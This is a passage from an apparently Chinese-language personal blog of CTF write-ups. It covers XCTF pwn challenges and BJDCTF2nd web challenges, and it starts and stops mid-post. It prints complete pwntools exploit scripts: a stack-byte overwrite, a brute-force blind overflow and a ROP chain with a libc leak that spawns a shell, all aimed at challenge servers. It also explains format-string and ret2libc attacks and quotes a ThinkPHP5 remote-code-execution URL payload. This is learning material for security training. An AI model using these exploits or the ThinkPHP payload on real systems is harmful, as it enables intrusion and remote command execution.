+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">res=remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">30504</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">res.recvuntil(<span class="string">&#x27;have:\n&#x27;</span>)</span><br><span class="line">res.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">res.recv()</span><br><span class="line">res.sendline(<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">posite,num</span>):</span><br><span class="line">	res.recvuntil(<span class="string">&#x27;exit\n&#x27;</span>)</span><br><span class="line">	res.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	res.recvuntil(<span class="string">&#x27;which number to change:\n&#x27;</span>)</span><br><span class="line">	res.sendline(<span class="built_in">str</span>(posite))</span><br><span class="line">	res.recvuntil(<span class="string">&#x27;new number:\n&#x27;</span>)</span><br><span class="line">	res.sendline(<span class="built_in">str</span>(num))</span><br><span class="line">change(<span class="number">0x84</span>, <span class="number">0x50</span>)</span><br><span class="line">change(<span class="number">0x85</span>, <span class="number">0x84</span>)</span><br><span class="line">change(<span class="number">0x86</span>, <span class="number">0x04</span>)</span><br><span class="line">change(<span class="number">0x87</span>, <span class="number">0x08</span>)</span><br><span class="line">change(<span class="number">0x8c</span>, <span class="number">0x87</span>)</span><br><span class="line">change(<span class="number">0x8d</span>, <span class="number">0x89</span>)</span><br><span class="line">change(<span class="number">0x8e</span>, <span class="number">0x04</span>)</span><br><span class="line">change(<span class="number">0x8f</span>, <span class="number">0x08</span>)</span><br><span class="line">res.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">res.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>前四个change是调用system函数，后四个是传入参数”sh”。</p>
+<p>虽然查到的保护机制并没有开启PIE，但是栈地址仍然是随机的。程序运行起来看到的才是真阿。</p>
+<h1 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h1><p><em>*简单的盲打</em></p>
+<p>第一次认真做盲pwn，之前在比赛中尝试过但没有做出，相比之下这道题确实比较简单。</p>
+<p>nc看一下</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/warmup/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8B%E5%8D%889.37.41.png" alt="nc"></p>
+<p>给了我们一个地址，应该是执行这个函数就能get shell。</p>
+<p>盲pwn，输了%d测试没有格式化字符串漏洞，估计就是栈溢出了。</p>
+<p>暴破exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">Target=<span class="number">0x40060d</span></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Attack</span>(<span class="params">PaddingLen,bit</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res=remote(<span class="string">&quot;220.249.52.133&quot;</span>,<span class="number">39150</span>)</span><br><span class="line">        res.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> bit==<span class="number">32</span>:</span><br><span class="line">            payload=<span class="string">&#x27;a&#x27;</span>*PaddingLen+p32(Target)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload=<span class="string">&#x27;b&#x27;</span>*PaddingLen+p64(Target)</span><br><span class="line">        res.sendline(payload)</span><br><span class="line">        ret=res.recv()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(ret)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(ret)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        res.close()</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;Go on&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    Attack(i,<span class="number">32</span>)</span><br><span class="line">    Attack(i,<span class="number">64</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Finish&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>每次攻击都会测试32位与64位。exp写的太烂，出flag也不会停下。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/warmup/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8B%E5%8D%889.22.26.png"></p>
+<p>flag夹杂在中间。期间还返回过奇怪的“-Warm up-”字符串，由于没有程序不知为何。</p>
+<h1 id="welpwn"><a href="#welpwn" class="headerlink" title="welpwn"></a>welpwn</h1><p><em>*这是一道很棒的pwn题，就如它的名字一样。</em></p>
+<p>看一下保护机制</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.49.21.png"></p>
+<p>64位的程序。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.50.37.png"></p>
+<p>读取了0x400字节到buf，没有溢出。继续看echo函数。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.50.45.png"></p>
+<p>可以看到刚才我们输入到字符串被拷贝进了s2，拷贝结束后最后一位改成0。但是s2仅仅只有16字节长而已，显然存在溢出。当时误以为这是一个类似【stack2】的题，简单构造了一个rop链最后多加一个用于归零的字符。并不可以。后来发现原来在拷贝时遇到\x00时就会停止，可是我们两个地址之间必有\x00。也就是说我们最多只能执行ret到一个地址。怎么利用呢？</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.51.33.png"></p>
+<p>在这里下个断点，gdb看一下。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.57.51.png"></p>
+<p>可以看到我们输入的字符串在fc0，经过拷贝到了fa0，两者间的距离是0x20。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.51.10.png"></p>
+<p>知道了buf是紧邻返回地址的，我们就可以构造一个巧妙的rop链。大概的思路是：我们写好padding溢出后加上一个可以pop 0x20个字节的gadget（下面称为pop20）后面跟上正常的rop链。这样为什么可行呢？拷贝结束后s2只有从padding到pop20的payload，而buf是完整的。程序溢出后返回地址被覆盖成pop20，执行后紧邻的buf会被pop 0x20个字节，也就是从padding到pop20都被pop了，所以紧接着的后半段payload就可以正常执行了。</p>
+<p>不得不说pwn真是太益智了。</p>
+<p>这个pop20可以通过Ropgadget来找</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.59.42.png"></p>
+<p>第一个就正好。4*8&#x3D;32（0x20）。就算没有找到也没关系，可以多个pop连在一起实现。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">res=remote(<span class="string">&quot;220.249.52.133&quot;</span>,<span class="number">59879</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">start=elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">clean_padding=<span class="number">0x40089c</span><span class="comment">#pop 0x20byte</span></span><br><span class="line">pop_rdi=<span class="number">0x4008A3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x4008a1</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(clean_padding)+p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(write_got)+p64(<span class="number">0</span>)+p64(write_plt)+p64(start)</span><br><span class="line">res.recvuntil(<span class="string">&#x27;RCTF\n&#x27;</span>)</span><br><span class="line">res.sendline(payload)</span><br><span class="line">write_got=res.recv(<span class="number">8</span>)</span><br><span class="line">write_got=u64(write_got)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_got))</span><br><span class="line">Searcher=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,<span class="number">0x2b0</span>)</span><br><span class="line">offset=write_got-Searcher.dump(<span class="string">&quot;write&quot;</span>)</span><br><span class="line">system=Searcher.dump(<span class="string">&quot;system&quot;</span>)+offset</span><br><span class="line">binsh=Searcher.dump(<span class="string">&quot;str_bin_sh&quot;</span>)+offset</span><br><span class="line">res.recvuntil(<span class="string">&#x27;RCTF\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(clean_padding)+p64(pop_rdi)+p64(binsh)+p64(system)</span><br><span class="line">res.sendline(payload)</span><br><span class="line">res.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这道题还有非常坑的一点，puts函数和printf函数失效，看来还是用write来泄漏地址最稳定。</p>
+<p>*学到许多阿。pwn真是太益智了。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://cdn.n0p3.cn/2020/04/18/XCTF-Pwn-Advance/" data-id="cleqs4p6w000lh4d7731f0x9b" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/" rel="tag">PWN</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="xctf-int-overflow" class="article article-type-xctf" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/13/int-overflow/" class="article-date">
+  <time datetime="2020-04-13T12:20:48.000Z" itemprop="datePublished">2020-04-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/13/int-overflow/">XCTF-Pwn新手区</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h1><p>nc链接一下题目。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190617.png" alt="连接"></p>
+<p>大概是先选择功能，再输入用户名，密码。一共有三次输入，这中间就可能存在漏洞。</p>
+<p>拖进ida</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190414.png" alt="ida"></p>
+<p>主函数中并没有明显的漏洞，跟踪到login中</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190436.png" alt="login"></p>
+<p>login函数里也没有找到可能的漏洞，输入的密码储存进了buf，并传递给了check_passwd函数</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190446.png" alt="check_passwd"></p>
+<p>在check_passwd函数里，变量v3声明为无符号整型，占8bit，即一个字节，用来储存s（刚才传入的buf）的长度。但是buf的长度是0x199，远大于v3的长度。8bit储存范围是0～255，由于无符号，超过255就会“循环”，256就与0相等。</p>
+<p>line8执行了判断，要求v3的范围在3～8之间。但是我们使v3溢出，在259～264亦可。</p>
+<p>测试一下</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190715.png" alt="测试"></p>
+<p>成功了，注意到在判断密码成功后，字符串会被拷贝进dest里，那么可以开始构造payload了。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190327.png" alt="target"></p>
+<p>在左侧的函数列表中有一个what_is_this，执行后就能getflag。观察一下栈的情况</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190520.png" alt="栈"></p>
+<p>所以payload，先’A’*0x14,填满dest和v3所占的空间，再’a’*4填满储存ebp的位置，然后就可以加上目标地址了。最后，要让payload的总长在259～264之间。</p>
+<p>exp如下</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20191528.png" alt="exp"></p>
+<p>运行即得flag。</p>
+<h1 id="Cgpwn2"><a href="#Cgpwn2" class="headerlink" title="Cgpwn2"></a>Cgpwn2</h1><p>nc连接一下题目</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/cgpwn2/%E6%88%AA%E5%B1%8F2020-04-15%20%E4%B8%8B%E5%8D%886.10.29.png" alt="nc"></p>
+<p>有两次输入，拖进ida看一下main函数</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/cgpwn2/%E6%88%AA%E5%B1%8F2020-04-15%20%E4%B8%8B%E5%8D%886.12.11.png" alt="main"></p>
+<p>建立了三个缓冲区，调用了hello函数，进hello函数看一下</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/cgpwn2/%E6%88%AA%E5%B1%8F2020-04-15%20%E4%B8%8B%E5%8D%886.12.22.png" alt="hello"></p>
+<p>有一段复杂的代码，暂时不知道是干什么的，下面是两次输入，第一次是对输入有限制的输入，第二次用的是危险的gets函数。</p>
+<p>变量name</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/cgpwn2/%E6%88%AA%E5%B1%8F2020-04-15%20%E4%B8%8B%E5%8D%886.13.08.png" alt="name"></p>
+<p>看函数列表</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/cgpwn2/%E6%88%AA%E5%B1%8F2020-04-15%20%E4%B8%8B%E5%8D%886.12.37.png" alt="list"></p>
+<p>还有一个pwn函数，里面调用了system函数。</p>
+<p>那么我们的思路就有了，把gets函数的返回地址覆盖为_system的地址，在输入名字的时候输入&#x2F;bin&#x2F;sh，让shellcode执行就可以了。</p>
+<p>exp如下</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/cgpwn2/%E6%88%AA%E5%B1%8F2020-04-15%20%E4%B8%8B%E5%8D%886.14.49.png" alt="exp"></p>
+<p>_shstr是shellcode的储存地址，p32(1)是调用_system时要覆盖的返回地址，随便写一个就可以。</p>
+<p>运行即可Get Shell。</p>
+<h1 id="string"><a href="#string" class="headerlink" title="string"></a>string</h1><p>连接题目看一下题</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/string/%E6%88%AA%E5%B1%8F2020-04-16%20%E4%B8%8B%E5%8D%889.25.06.png" alt="nc"></p>
+<p>文本量巨大，能看出是个rpg游戏，开头有法师说会给予你帮助，你自己打不败恶龙，然后告诉了我们两个秘密。secret是一个数组，储存了看起来像地址的数据。暂时不知道有什么用。</p>
+<p>拖进ida分析</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/string/%E6%88%AA%E5%B1%8F2020-04-16%20%E4%B8%8B%E5%8D%8811.54.09.png" alt="main"></p>
+<p>在main函数可以看到v3被赋值给了v4，v3是malloc申请的一个8bit空间的地址，再根据下面的输出，可以推断出，v3就是secret。</p>
+<p>再跟踪到sub_400D72</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/string/%E6%88%AA%E5%B1%8F2020-04-16%20%E4%B8%8B%E5%8D%8811.26.08.png" alt="1"></p>
+<p>注意到23行存在格式化字符串漏洞。暂时还不知道利用它可以干嘛。返回然后进入sub_400CA6，传入的参数a1就是secret，也就是main函数里的v3。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/string/%E6%88%AA%E5%B1%8F2020-04-16%20%E4%B8%8B%E5%8D%8811.27.37.png" alt="2"></p>
+<p>在最后的if部分可以看到，使secret[0]和secret[1]两个地址指向的值相等就可以获得法师的帮助，v1在17行强制转换成了一个函数指针并执行指向的函数。</p>
+<p>所以我们的攻击思路就是，利用格式化字符串漏洞把secret[0]值修改为85使if成立，然后输入shellcode就可以get shell了。</p>
+<p>exp</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/string/%E6%88%AA%E5%B1%8F2020-04-16%20%E4%B8%8B%E5%8D%8811.25.17.png" alt="exp"></p>
+<p>要覆盖的值的地址在payload发送前写入栈，然后利用漏洞修改这个地址的值。paylaod中的&#39;7&#39;是试验出的结果，前一次输入的地址被保存在了步长为7的位置。</p>
+<p><em>本题要感谢<strong>不会修电脑</strong>师傅的指点</em></p>
+<h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1><p>直接拖进IDA分析</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/level3/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8A%E5%8D%8810.35.15.png" alt="main"></p>
+<p>没什么东西，去看vulnerable_function</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/level3/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8A%E5%8D%8810.35.42.png" alt="vf"></p>
+<p>第6行调用了read读取了0x100byte，但是buf只有0x88byte，存在栈溢出漏洞。但是并没有system函数可以利用，而是给了libc，所以是ret2libc。我们要从libc中载入system和&#x2F;bin&#x2F;sh，就要先获得它们的got地址。</p>
+<p><strong>攻击思路：</strong>先泄漏write函数（read函数亦可）的got地址，然后减去write函数在libc中的地址，就能得到offset（偏移），那么由于libc中的地址相对固定，就可以根据&#39;libc地址+offset&#x3D;got地址&#39;算出system函数和&#x2F;bin&#x2F;sh的got地址。</p>
+<p>有了这两个地址，就可以当普通的栈溢出做了。</p>
+<p>完整exp如下</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/level3/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8B%E5%8D%881.40.23.png" alt="exp"></p>
+<p>需要注意的是，如果PIE保护开启，offset将是动态的，就不能通过计算一个函数的offset去推算其他函数。</p>
+<p>此外，两次payload必须在同一次程序运行过程中完成，不能分成第一次运行获得地址，第二次运行执行栈溢出攻击。因为程序的每一次运行，外部函数在got表中的实际地址都是不同的，所以我们的第一个rop链中必须使程序返回到合适的位置，在上面的exp中，第一次write执行后返回到了main函数，以便可以执行第二个payload。</p>
+<p><em>[<strong>此处是个人理解部分</strong>]</em>  在rop链中，希望调用的外部函数地址，可以是plt表中的地址，也可以是got表中的实际地址，因为plt地址指向的数据就是这个函数在got表的实际地址。</p>
+<p><em>本题要感谢<strong>Thriumph</strong>师傅的指点</em></p>
+<h1 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h1><p><em>这一题也是格式化字符串漏洞，但是比较简单，可以独立完成</em></p>
+<p>直接ida看题</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/CGfsb/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8B%E5%8D%885.58.22.png" alt="main"></p>
+<p>很直白，在23行存在格式化字符串漏洞，再看到下面的if条件，很明显是要我们利用漏洞修改pwnme的值为8.</p>
+<p>看一下pwnme</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/CGfsb/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8B%E5%8D%886.07.25.png" alt="pwnme"></p>
+<p>是全局变量，所以地址不变。</p>
+<p>题目一共输入了两次，第一次输入在了buf缓冲区，猜测可能是要在这里输入目标地址。但是read限制读取10个字符，再看栈</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/CGfsb/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8B%E5%8D%886.07.10.png" alt="栈"></p>
+<p>0x7E-10&#x3D;0x75，正好在s变量前，所以不存在溢出，也无法利用格式化漏洞读取到。所以我们要在输入s中输入先输入地址，然后修改这个地址的值。</p>
+<p>exp如下</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/CGfsb/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8B%E5%8D%886.20.14.png" alt="exp"></p>
+<p>%10$n中的10是测试出来的offset。</p>
+<p>32位的地址是32bit，也就是4个字节，经过测试，程序字符集可能是ascii或utf-8，所以4个字节就是4个字符。为了使pwnme的值为8，所以payload里多加4个a，这样最终一共输出8个字符，%10n就会把第10个位置的值赋值为8。</p>
+<h1 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h1><p>学Pwn七天，学到的东西没有很多，但是原理和小细节都弄清楚了，这些漏洞的高级运用方法还要在以后认真学习。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://cdn.n0p3.cn/2020/04/13/int-overflow/" data-id="cleqs4p70000xh4d76ds3go6z" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/" rel="tag">PWN</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-BJDCTF2nd" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/08/BJDCTF2nd/" class="article-date">
+  <time datetime="2020-04-08T01:53:11.000Z" itemprop="datePublished">2020-04-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/08/BJDCTF2nd/">BJDCTF2nd</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>BJDCTF2nd是北京工业大学的第二次新生赛。密码题比较基础，AK了，杂项解出了6题，都不难，Web解出两题，记录一下。</p>
+<h1 id="FAKE-GOOGLE"><a href="#FAKE-GOOGLE" class="headerlink" title="FAKE GOOGLE"></a>FAKE GOOGLE</h1><p>拿到题目，界面如下</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%889.52.05.png" alt="主页"></p>
+<p>随便输入搜索</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%889.52.30.png" alt="搜索结果页面"></p>
+<p>直接看到回显，有可能存在xss，如果用了模板则可能有ssti</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%889.58.34.png" alt="测试flask注入payload"></p>
+<p>payload测试，发现注入成功</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%889.58.43.png" alt="结果"></p>
+<p>在目录中寻找flag.</p>
+<p>Get flag.</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%889.59.11.png" alt="flag"></p>
+<h1 id="OLD-HACKER"><a href="#OLD-HACKER" class="headerlink" title="OLD HACKER"></a>OLD HACKER</h1><p>打开题目</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%8810.08.41.png" alt="主页"></p>
+<p>主页上没有可交互的地方，乍一看无从下手</p>
+<p>注意到中间提示ThinkPhp5，可能是有关tp5的漏洞考察</p>
+<p>找到tp5曾经有过一个rce漏洞，用payload测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=dir</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%8810.30.18.png" alt="报错信息"></p>
+<p>根据信息发现版本5.023</p>
+<p>用5.023的payload</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-08%20%E4%B8%8A%E5%8D%8810.45.17.png" alt="payload"></p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BJDCTF2nd/%E6%88%AA%E5%B1%8F2020-04-09%20%E4%B8%8B%E5%8D%884.07.14.png" alt="flag"></p>
+<p>最后调整命令get flag</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://cdn.n0p3.cn/2020/04/08/BJDCTF2nd/" data-id="cleqs4p6m0003h4d7f9vnesuf" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-InfantGameEngine" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/05/InfantGameEngine/" class="article-date">
+  <time datetime="2020-04-05T06:49:12.000Z" itemprop="datePublished">2020-04-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
